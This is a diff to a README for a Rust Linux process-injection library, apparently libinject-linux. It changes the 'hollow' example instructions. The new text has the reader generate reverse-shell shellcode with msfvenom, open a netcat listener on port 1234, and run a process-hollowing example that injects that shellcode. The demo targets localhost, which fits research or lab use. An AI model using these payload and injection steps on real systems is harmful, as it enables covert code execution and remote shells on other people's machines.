@@ -28,15 +28,17 @@ Run the `memfd` example
 cargo run --example memfd
 ```
 
-To run the `hollow` example, first `cd libinject-linux/examples` and then
-```bash
-cargo run --example hollow
-```
-
-The example shellcode was generated using the following command
+To run the `hollow` example, first `cd libinject-linux/examples` and then generate shellcode, e.g.,
 ```bash
 msfvenom --payload 'linux/x64/shell_reverse_tcp' LHOST=127.0.0.1 LPORT=1234 --format 'raw' --platform 'linux' --arch 'x64' --out shellcode.bin
 ```
 
-### Standalone Binary
-TODO: Write docs for standalone binary.
+Start a listener
+```bash
+nc -lvnp 1234
+```
+
+Run the `hollow` example
+```bash
+cargo run --example hollow
+```
